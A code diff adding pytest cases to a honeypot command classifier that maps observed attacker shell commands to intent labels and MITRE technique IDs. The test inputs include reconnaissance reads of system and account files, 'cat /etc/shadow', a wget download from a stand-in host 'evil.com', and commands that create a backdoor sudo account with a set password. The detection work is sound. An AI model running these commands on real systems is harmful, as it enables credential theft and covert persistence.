@@ -193,6 +193,78 @@ class TestClassifyCommand:
 # classify_login
 # ---------------------------------------------------------------------------
 
+class TestFingerprintFilesRegardlessOfReader:
+    """The rules used to require `cat` before a fingerprint file.
+
+    Attackers read /proc/version and friends with head, awk, `[ -f ... ]` or a
+    while-read loop far more often than with cat, so the cat-anchored rules
+    matched none of the 8,932 commands that landed in `unknown` in production.
+    What identifies the intent is the file being read, not the tool used.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        "head -1 /proc/version | cut -d -f1",
+        "[ -f /proc/version ]",
+        "( [ -f /proc/version ]",
+        "[ -f /etc/os-release ]",
+        "awk /MemTotal/{print $2} /proc/meminfo 2 > /dev/null",
+        'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo',
+        "grep -c ^processor /proc/cpuinfo",
+        "grep 'model name' /proc/cpuinfo 2>/dev/null | head -1",
+    ])
+    def test_system_fingerprint_files_are_reconnaissance(self, cmd):
+        assert classify_command(cmd) == ("reconnaissance", "T1082")
+
+    @pytest.mark.parametrize("cmd", [
+        "wc -l < /etc/passwd 2 > /dev/null",
+        "cat /etc/passwd",
+    ])
+    def test_account_files_are_reconnaissance(self, cmd):
+        assert classify_command(cmd) == ("reconnaissance", "T1087")
+
+    @pytest.mark.parametrize("cmd", [
+        "rpm -qa 2 > /dev/null | wc -l",
+        "dpkg -l 2 > /dev/null | grep -c ^ii",
+    ])
+    def test_package_inventory_is_software_discovery(self, cmd):
+        assert classify_command(cmd) == ("reconnaissance", "T1518")
+
+    def test_df_with_a_path_not_just_a_flag(self, cmd=None):
+        """`df\\s+-` missed `df /`, which is how the real samples call it."""
+        assert classify_command("df / 2 > /dev/null | awk NR==2{print $2}")[0] == "reconnaissance"
+
+    def test_shadow_still_outranks_passwd(self):
+        """Ordering guard: credential theft must keep winning over recon."""
+        assert classify_command("cat /etc/shadow") == ("credential_theft", "T1003.008")
+
+    def test_download_still_outranks_fingerprint_read(self):
+        """A command doing both is malware deployment, not recon."""
+        intent, _ = classify_command("wget http://evil.com/x; cat /proc/version")
+        assert intent == "malware_deployment"
+
+
+class TestAccountCreationIsPersistence:
+    """Creating a local account on a honeypot is a backdoor, not noise.
+
+    These went to `unknown` in production, so an attacker adding themselves to
+    sudo produced no signal at all.
+    """
+
+    @pytest.mark.parametrize("cmd, mitre", [
+        ("useradd -m -s /bin/bash admin1", "T1136.001"),
+        ("adduser backdoor", "T1136.001"),
+    ])
+    def test_account_creation(self, cmd, mitre):
+        assert classify_command(cmd) == ("persistence", mitre)
+
+    @pytest.mark.parametrize("cmd", [
+        "usermod -aG sudo admin1",
+        "echo admin1:modzmodz | chpasswd",
+    ])
+    def test_account_manipulation(self, cmd):
+        assert classify_command(cmd) == ("persistence", "T1098")
+
+
 class TestClassifyLogin:
     def test_failed_login(self):
         assert classify_login(False) == ("brute_force", "T1110")
